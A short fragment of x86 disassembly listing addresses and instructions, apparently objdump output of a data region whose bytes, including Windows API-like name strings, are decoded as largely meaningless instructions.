  4246f9:	dec    ebx
  4246fa:	add    BYTE PTR [ecx],dh
  4246fc:	add    BYTE PTR [ebp+0x0],al
  4246ff:	pop    edi
  424700:	add    BYTE PTR [edx+0x0],bl
  424703:	add    BYTE PTR [eax],al
  424705:	push   esp
  424706:	add    BYTE PTR [edi],dh
  424708:	add    BYTE PTR [ebx+0x0],al
  42470b:	pop    edi
  42470c:	add    BYTE PTR [edx+0x0],al
  42470f:	xor    al,BYTE PTR [eax]
  424711:	xor    DWORD PTR [eax],eax
  424713:	push   ebx
  424714:	add    BYTE PTR [ecx],dh
  424716:	add    BYTE PTR [ecx],bh
  424718:	add    BYTE PTR [edx+0x0],al
  42471b:	add    BYTE PTR [eax],al
  42471d:	inc    edi
  42471e:	add    BYTE PTR [ebp+0x0],al
  424721:	xor    al,0x0
  424723:	cmp    BYTE PTR [eax],al
  424725:	add    BYTE PTR [eax],al
  424727:	add    al,dh
  424729:	inc    edx
  42472a:	add    BYTE PTR [eax+esi*8],al
  42472d:	inc    edx
  42472e:	add    BYTE PTR [eax],cl
  424730:	lock inc edx
  424732:	add    BYTE PTR [eax+esi*8],cl
  424735:	inc    edx
  424736:	add    BYTE PTR [eax],dl
  424738:	lock inc edx
  42473a:	add    BYTE PTR [eax+esi*8],dl
  42473d:	inc    edx
  42473e:	add    BYTE PTR [eax],bl
  424740:	lock inc edx
  424742:	add    BYTE PTR [eax+esi*8],bl
  424745:	inc    edx
  424746:	add    BYTE PTR [eax],ah
  424748:	lock inc edx
  42474a:	add    BYTE PTR [eax+esi*8],ah
  42474d:	inc    edx
  42474e:	add    BYTE PTR [eax],ch
  424750:	lock inc edx
	...
  424762:	add    BYTE PTR [eax],al
  424764:	call   0x0:0x4d3ef2
  42476b:	add    BYTE PTR [edx+0x1000247],dl
  424771:	add    BYTE PTR [eax],al
  424773:	add    BYTE PTR [ecx],al
  424775:	add    BYTE PTR [eax],al
  424777:	add    BYTE PTR [ecx],al
  424779:	add    BYTE PTR [eax],al
  42477b:	add    BYTE PTR [eax-0x73fffdb9],cl
  424781:	inc    edi
  424782:	add    al,BYTE PTR [eax]
  424784:	nop
  424785:	inc    edi
  424786:	add    al,BYTE PTR [eax]
  424788:	fdivr  QWORD PTR [eax+eax*1]
  42478b:	add    BYTE PTR [esi+0x247],bl
  424791:	add    BYTE PTR [edi+0x6f],dl
  424794:	jb     0x4247fa
  424796:	push   edi
  424797:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42479e:	aas    
  42479f:	inc    ebx
  4247a0:	ins    BYTE PTR es:[edi],dx
  4247a1:	outs   dx,DWORD PTR ds:[esi]
  4247a2:	jae    0x424809
  4247a4:	push   edi
  4247a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4247ac:	popa   
  4247ad:	je     0x424818
  4247af:	outs   dx,DWORD PTR ds:[esi]
  4247b0:	outs   dx,BYTE PTR ds:[esi]
  4247b1:	inc    ebx
  4247b2:	ins    BYTE PTR es:[edi],dx
  4247b3:	outs   dx,DWORD PTR ds:[esi]
  4247b4:	jae    0x42481b
  4247b6:	push   edi
  4247b7:	imul   eax,DWORD PTR [eax],0x0
	...
